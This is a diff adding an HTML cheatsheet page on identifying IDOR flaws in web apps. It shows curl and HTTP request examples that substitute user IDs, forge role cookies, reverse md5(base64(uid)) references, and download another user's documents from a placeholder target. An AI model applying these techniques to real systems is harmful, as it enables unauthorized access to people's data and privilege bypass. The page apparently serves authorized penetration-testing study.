@@ -1,0 +1,332 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Identifying · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › IDOR</nav><h1>Identifying</h1><p class="cx-lede">How to spot direct object references and the missing access-control around them - URL parameters, REST path segments, JSON body fields, AJAX-only function calls hidden in JS bundles, hashed/encoded references that look opaque but aren&#x27;t, and the multi-account workflow for comparing what each role can see.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1213</span><span class="cx-tag">D3FEND D3-IAA</span><span class="cx-tag">IMPACT DataExfil, AuthBypass</span><span class="cx-tag">OWASP A01</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Find the reference first, test access second. Four discovery surfaces in priority order:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. URL parameters and path segments
+?uid=1     ?file_id=123     ?contract=cdd9...     /users/74     /files/Report.pdf
+
+# 2. JSON body fields in API calls
+{&quot;uid&quot;: 74, &quot;uuid&quot;: &quot;40f5...&quot;, &quot;role&quot;: &quot;employee&quot;}
+
+# 3. AJAX call definitions in front-end JS (admin-only endpoints exposed in client code)
+grep -rE &#x27;ajax\(|fetch\(&#x27; static/js/
+
+# 4. Headers and cookies carrying identity
+Cookie: uid=1; role=employee     X-User-Id: 1     Authorization: Bearer &lt;token&gt;
+
+# Then for each reference: substitute, observe
+curl -b &#x27;PHPSESSID=mine&#x27; http://target/api/profile/2     # someone else&#x27;s</code></pre></figure>
+<p>Success indicator: you've cataloged every direct reference the app uses, identified which substitutions actually return foreign data, and know whether the references are sequential / hashed / encoded.</p>
+<h2 id="the-four-discovery-surfaces">The four discovery surfaces</h2>
+<h3 id="surface-1-url-parameters-and-path-segments">Surface 1 - URL parameters and path segments</h3>
+<p>The textbook IDOR location. Browse the app as your test user, watch the URL bar and Burp HTTP history for any parameter or path component that maps to a resource you own.</p>
+<p>Patterns that almost always identify a direct reference:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?uid=1                      # user identifier
+?id=123                     # generic record ID
+?file_id=123                # file lookup
+?filename=Report.pdf        # filename as direct handle
+?invoice_id=2021-001        # composite key
+?account_id=abc             # opaque-looking but still a handle
+/users/74                   # REST path
+/files/Report.pdf           # filename in path
+/documents/Invoice_1_09_2021.pdf   # filename embeds owner&#x27;s uid + date</code></pre></figure>
+<p>Sequential numeric handles are the easiest case; you increment and watch. Filename-embedded handles like <code>Invoice_1_09_2021.pdf</code> are the second easiest - the <code>1</code> is the owner's user ID, and <code>09_2021</code> is a date, so the file naming convention itself leaks the predictable pattern.</p>
+<p>When you find a candidate, the test is just substitution:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Baseline - your own resource
+$ curl -sb &#x27;PHPSESSID=mine&#x27; &#x27;http://target/documents.php?uid=1&#x27; | wc -c
+4823
+
+# Substitute someone else&#x27;s reference
+$ curl -sb &#x27;PHPSESSID=mine&#x27; &#x27;http://target/documents.php?uid=2&#x27; | wc -c
+3719
+
+# Different size → different content → IDOR (probably)</code></pre></figure>
+<p>Always check page size or hash the body, not just the rendered output - apps sometimes show the <em>same</em> UI shell but with different data inside. If <code>wc -c</code> differs, you got something different back even when the page looks similar.</p>
+<h3 id="surface-2-json-body-fields">Surface 2 - JSON body fields</h3>
+<p>For API endpoints, the reference is often inside the request body. Intercept the request:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">PUT /profile/api.php/profile/1 HTTP/1.1
+Cookie: PHPSESSID=...; role=employee
+Content-Type: application/json
+
+{
+    &quot;uid&quot;: 1,
+    &quot;uuid&quot;: &quot;40f5888b67c748df7efba008e7c2f9d2&quot;,
+    &quot;role&quot;: &quot;employee&quot;,
+    &quot;full_name&quot;: &quot;Amy Lindon&quot;,
+    &quot;email&quot;: &quot;a_lindon@employees.local&quot;,
+    &quot;about&quot;: &quot;...&quot;
+}</code></pre></figure>
+<p>Note the <em>multiple</em> direct references in this one request:</p>
+<ul>
+<li><code>uid</code> in the body</li>
+<li><code>uid</code> in the URL path (<code>/profile/1</code>)</li>
+<li><code>uuid</code> in the body - opaque-looking handle, often the secondary key the back-end uses for authorization</li>
+<li><code>role</code> - privilege handle the back-end might trust from the body</li>
+</ul>
+<p>Each is a separate candidate for substitution. The naive bypass tries each in isolation:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">PUT /profile/api.php/profile/2 HTTP/1.1
+{&quot;uid&quot;: 2, &quot;uuid&quot;: &quot;...&quot;, &quot;role&quot;: &quot;employee&quot;, ...}</code></pre></figure>
+<p>Many apps catch the mismatch (<code>"uid mismatch"</code>, <code>"uuid mismatch"</code>) - the lesson is these are <em>partial</em> defenses. A real engagement chains the disclosure surface (GET to retrieve someone else's uuid) with the modification surface (PUT now-armed with the matching uuid). See <a href="../insecure-apis/index.html">Insecure APIs</a>.</p>
+<h3 id="surface-3-ajax-calls-in-front-end-js">Surface 3 - AJAX calls in front-end JS</h3>
+<p>The interesting surface that black-box scanners miss. Many modern apps ship the entire function catalog in the JS bundle and gate each call by role on the client:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">function changeUserPassword() {
+    $.ajax({
+        url: &quot;change_password.php&quot;,
+        type: &quot;post&quot;,
+        dataType: &quot;json&quot;,
+        data: {uid: user.uid, password: user.password, is_admin: is_admin},
+        success: function(result){
+            //
+        }
+    });
+}
+
+function deleteUser(targetUid) {
+    if (!is_admin) return;
+    $.ajax({
+        url: &quot;/api/users/&quot; + targetUid,
+        type: &quot;DELETE&quot;,
+    });
+}</code></pre></figure>
+<p>When you log in as a regular user, <code>is_admin</code> is false and <code>deleteUser</code> is never invoked from the UI. But the function exists in the JS - and the server-side endpoint <code>/api/users/&lt;id&gt;</code> exists too, because the JS calls it when an admin is logged in. The question: does the back-end check the caller's role, or just trust that the UI gates the call?</p>
+<p>To find these, scan the JS for <code>ajax(</code>, <code>fetch(</code>, and <code>axios(</code>:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Save the page&#x27;s resources
+$ wget -r -np -k -p http://target/
+
+# Find AJAX calls
+$ grep -rnE &quot;ajax\(|fetch\(|axios\.&quot; target/
+
+# Or use Burp&#x27;s &quot;Find references&quot; against the JS file in HTTP history</code></pre></figure>
+<p>For minified bundles, use <code>js-beautify</code> or open in Chrome DevTools (Sources → right-click → "Format"). Most beautified bundles reveal function names that hint at the operation (<code>changePassword</code>, <code>deleteUser</code>, <code>setRole</code>, <code>getAdminStats</code>).</p>
+<p>Each AJAX call definition is a candidate endpoint to probe directly with curl or Burp. Send the request as a non-admin user with admin-shaped parameters - if it succeeds, that's IDOR.</p>
+<h3 id="surface-4-headers-cookies-identity-tokens">Surface 4 - Headers, cookies, identity tokens</h3>
+<p>The reference doesn't always live in the URL or body. Sometimes the app trusts a header:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">GET /api/profile HTTP/1.1
+Cookie: uid=1; role=employee
+X-User-Id: 1</code></pre></figure>
+<p>Either or both of those identity carriers might be authoritative. Change them:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">GET /api/profile HTTP/1.1
+Cookie: uid=2; role=employee
+X-User-Id: 2</code></pre></figure>
+<p>The classic mistake: the server reads identity from a header the <em>client</em> sets. The header should come from the server-side session, never from a request the client constructs. When you see identity carried in a header, that's the test - substitute and observe.</p>
+<p>For bearer tokens (<code>Authorization: Bearer eyJ...</code>), the token may encode identity in its claims (JWT) or be opaque (random opaque session). For JWT, see <a href="../../auth/jwt/index.html">JWT attacks</a>; for opaque tokens, the question is whether a <em>different</em> user's token works in your request - which it doesn't unless you've harvested it (see <a href="../../sessions/obtaining-tokens/index.html">Obtaining tokens</a>).</p>
+<h2 id="hashing-and-encoding-inspection">Hashing and encoding inspection</h2>
+<p>When the reference looks opaque, don't assume it's secure. Apps frequently apply weak transformations that an operator can reverse.</p>
+<h3 id="quick-encoding-checks">Quick encoding checks</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Suspect: ?filename=ZmlsZV8xMjMucGRm
+$ echo &#x27;ZmlsZV8xMjMucGRm&#x27; | base64 -d
+file_123.pdf       # base64 - now obviously enumerable
+
+# Suspect: ?contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
+$ echo -n 1 | md5sum
+c4ca4238a0b923820dcc509a6f75849b -
+$ echo -n 1 | base64 | md5sum
+cdd96d3cc73d1dbdaffa03cc6cd7339b -    # match! it&#x27;s md5(base64(uid))
+
+# Or use hash-identifier for unknown algorithms
+$ hash-identifier &#x27;cdd96d3cc73d1dbdaffa03cc6cd7339b&#x27;
+# (likely MD5)</code></pre></figure>
+<p>The pattern to test, in order:</p>
+<table>
+<thead>
+<tr>
+<th>Try</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Base64 decode</td>
+<td>Most common encoding</td>
+</tr>
+<tr>
+<td>URL decode</td>
+<td>Sometimes the reference is just URL-encoded</td>
+</tr>
+<tr>
+<td>Hex decode</td>
+<td>Less common</td>
+</tr>
+<tr>
+<td><code>echo -n &lt;value&gt; \| md5sum</code></td>
+<td>The reference might be <code>md5(uid)</code> directly</td>
+</tr>
+<tr>
+<td><code>echo -n &lt;value&gt; \| sha1sum</code></td>
+<td>Less common but exists</td>
+</tr>
+<tr>
+<td><code>echo -n &lt;value&gt; \| base64 \| md5sum</code></td>
+<td>Combination</td>
+</tr>
+<tr>
+<td><code>echo -n &lt;username&gt; \| md5sum</code></td>
+<td>Sometimes the username, not uid</td>
+</tr>
+<tr>
+<td><code>echo -n &lt;value&gt;:&lt;salt&gt; \| md5sum</code></td>
+<td>If you can guess the salt (often the app name, domain, or <code>secret</code>)</td>
+</tr>
+</tbody>
+</table>
+<p>The hash function variants get tried in increasing order of complexity. Most apps that hash references at all do something naive - the first three or four attempts usually find it.</p>
+<h3 id="finding-the-algorithm-in-the-front-end">Finding the algorithm in the front-end</h3>
+<p>When the hash isn't an obvious format, the cleanest discovery method is reading the JS that calls the endpoint:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">function downloadContract(uid) {
+    $.redirect(&quot;/download.php&quot;, {
+        contract: CryptoJS.MD5(btoa(uid)).toString(),
+    }, &quot;POST&quot;, &quot;_self&quot;);
+}</code></pre></figure>
+<p>This tells you: the <code>contract</code> field is <code>md5(base64(uid))</code>. Generate that for any uid:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ echo -n 1 | base64 -w 0 | md5sum
+cdd96d3cc73d1dbdaffa03cc6cd7339b -
+
+$ echo -n 2 | base64 -w 0 | md5sum
+0b7e7dee87b1c3b98e72131173dfbbbf -</code></pre></figure>
+<p>Confirm by matching your test account's expected hash. Once it matches, the references are "secure-looking" but mass-enumerable. See <a href="../mass-enumeration/index.html">Mass enumeration</a>.</p>
+<p>The <code>-n</code> and <code>-w 0</code> flags matter - they strip trailing newlines from <code>echo</code> and <code>base64</code> respectively. A hash of <code>1\n</code> is different from a hash of <code>1</code>, and apps almost always hash without the newline.</p>
+<h3 id="when-the-source-isnt-available">When the source isn't available</h3>
+<p>Without front-end source, you can still brute-force the formula:</p>
+<ol>
+<li>Register two test accounts; capture each one's reference value</li>
+<li>Try hashing each candidate (uid, username, email, account_creation_timestamp, ...) with common algorithms (md5, sha1, sha256) and combinations</li>
+<li>When a candidate-algorithm pair produces both observed references, you've found it</li>
+</ol>
+<p>Burp Comparer can help - paste your observed reference, then iterate test hashes and compare. If you build a small wordlist of (algorithm, input-source) pairs, it's a quick scripted exercise.</p>
+<p>When nothing matches, the references probably involve a server-side secret (HMAC) or non-deterministic input (random UUID stored in DB). Those are genuinely secure direct references - the bypass story has to come from the access-control layer instead, not from predicting the reference.</p>
+<h2 id="comparing-user-roles-across-accounts">Comparing user roles across accounts</h2>
+<p>For advanced IDOR work, register two accounts with different roles and diff their requests. This reveals:</p>
+<ul>
+<li>Endpoints only one role calls (admin-only function discoveries)</li>
+<li>Parameters one role includes that the other doesn't (role/permission claims in JSON body)</li>
+<li>Headers that differ between roles (a <code>Cookie: role=admin</code> vs <code>Cookie: role=user</code> is a giant red flag)</li>
+<li>API endpoints the admin role accesses with paths you can then try as the lower-privilege role</li>
+</ul>
+<p>The workflow:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Account A (employee role)         Account B (admin role)
+       │                                │
+       │   Browse exhaustively          │   Browse exhaustively
+       │   (Burp scope on the host)     │   (Burp scope on the host)
+       ▼                                ▼
+   Site map A                       Site map B
+       │                                │
+       └───────────  diff  ─────────────┘
+                       │
+                       ▼
+              Endpoints in B but not A
+              Parameters in B but not A
+              Headers/cookies that differ
+                       │
+                       ▼
+         Try each B-only endpoint while
+         authenticated as A; observe</code></pre></figure>
+<p>Burp Comparer (Tools → Compare site maps) is the canonical implementation. For each B-only endpoint, send the request through Burp Repeater with A's cookies. If the server-side access-control is missing, A receives admin-level responses.</p>
+<p>A specific case worth testing: the back-end may key authorization off <code>role=employee</code> in the request <em>cookie</em> rather than the session. Set <code>Cookie: role=admin</code> manually and re-issue the request. Apps that read role from the client-side cookie (depressingly common) accept the bypass instantly.</p>
+<h2 id="a-worked-identification-walkthrough">A worked identification walkthrough</h2>
+<p>Suppose you find <code>documents.php?uid=1</code> in an Employee Manager app:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Step 1: confirm the reference matters
+$ curl -sb &#x27;PHPSESSID=mine&#x27; &#x27;http://target/documents.php?uid=1&#x27; | grep -c &#x27;&lt;li class&#x27;
+2          # 2 document entries for me
+
+# Step 2: substitute
+$ curl -sb &#x27;PHPSESSID=mine&#x27; &#x27;http://target/documents.php?uid=2&#x27; | grep -c &#x27;&lt;li class&#x27;
+3          # 3 entries - different data, different user
+
+# Step 3: extract the references
+$ curl -sb &#x27;PHPSESSID=mine&#x27; &#x27;http://target/documents.php?uid=2&#x27; | grep -oP &#x27;/documents\S+\.pdf&#x27;
+/documents/Invoice_2_08_2020.pdf
+/documents/Report_2_12_2020.pdf
+/documents/Notes_2.pdf
+
+# Step 4: fetch a foreign document
+$ curl -sb &#x27;PHPSESSID=mine&#x27; &#x27;http://target/documents/Invoice_2_08_2020.pdf&#x27; -o /tmp/foreign.pdf
+$ file /tmp/foreign.pdf
+/tmp/foreign.pdf: PDF document, version 1.4</code></pre></figure>
+<p>Three substitutions, three confirmations:</p>
+<ol>
+<li>The <code>uid</code> parameter is honored without auth check (returns user 2's document list)</li>
+<li>The document filenames embed the owner's <code>uid</code> (predictable enumeration vector)</li>
+<li>Document downloads themselves don't check ownership either (parallel IDOR in the static-file path)</li>
+</ol>
+<p>Each is its own finding; mass enumeration is just looping over <code>uid</code> and downloading each result. See <a href="../mass-enumeration/index.html">Mass enumeration</a>.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Spot URL-parameter reference</td>
+<td><code>?uid=</code>, <code>?id=</code>, <code>?file_id=</code>, <code>?filename=</code>, <code>?contract=</code>, anything ending in <code>_id</code> or <code>_uid</code></td>
+</tr>
+<tr>
+<td>Spot REST path reference</td>
+<td>Segments that look like numeric or UUID-shaped: <code>/users/74</code>, <code>/files/abc-123</code></td>
+</tr>
+<tr>
+<td>Spot JSON body reference</td>
+<td>Object keys: <code>uid</code>, <code>uuid</code>, <code>user_id</code>, <code>account_id</code>, <code>role</code></td>
+</tr>
+<tr>
+<td>Spot header reference</td>
+<td><code>X-User-Id</code>, <code>Cookie: uid=</code>, anything client-set that names a user/resource</td>
+</tr>
+<tr>
+<td>Find AJAX-defined endpoints in JS</td>
+<td><code>grep -rnE 'ajax\(\|fetch\(\|axios\.' static/</code></td>
+</tr>
+<tr>
+<td>Beautify minified JS</td>
+<td><code>js-beautify file.min.js</code> or DevTools Sources → "Format"</td>
+</tr>
+<tr>
+<td>Test substitution</td>
+<td>Change the reference value, compare response size</td>
+</tr>
+<tr>
+<td>Reverse base64</td>
+<td><code>echo '&lt;value&gt;' \| base64 -d</code></td>
+</tr>
+<tr>
+<td>Test md5(uid)</td>
+<td><code>echo -n &lt;uid&gt; \| md5sum</code></td>
+</tr>
+<tr>
+<td>Test md5(base64(uid))</td>
+<td><code>echo -n &lt;uid&gt; \| base64 -w 0 \| md5sum</code></td>
+</tr>
+<tr>
+<td>Test sha1(uid)</td>
+<td><code>echo -n &lt;uid&gt; \| sha1sum</code></td>
+</tr>
+<tr>
+<td>Identify hash format</td>
+<td><code>hash-identifier '&lt;hash&gt;'</code></td>
+</tr>
+<tr>
+<td>Strip newlines</td>
+<td><code>echo -n</code> and <code>base64 -w 0</code></td>
+</tr>
+<tr>
+<td>Compare two accounts' site maps</td>
+<td>Burp → Tools → Compare site maps</td>
+</tr>
+<tr>
+<td>Role-cookie probe</td>
+<td>Manually set <code>Cookie: role=admin</code> and replay</td>
+</tr>
+<tr>
+<td>Quick foreign-resource fetch</td>
+<td><code>curl -b 'session=mine' 'http://target/api/profile/2'</code></td>
+</tr>
+</tbody>
+</table>
+<p>For mass-extraction techniques after identification, continue to <a href="../mass-enumeration/index.html">Mass enumeration</a>. For the API-mutation patterns (PUT/POST/DELETE on user objects), see <a href="../insecure-apis/index.html">Insecure APIs</a>.</p></article><nav class="cx-pager"><a class="cx-prev" href="../index.html">Previous: IDOR</a><a class="cx-next" href="../mass-enumeration/index.html">Next: Mass Enumeration</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
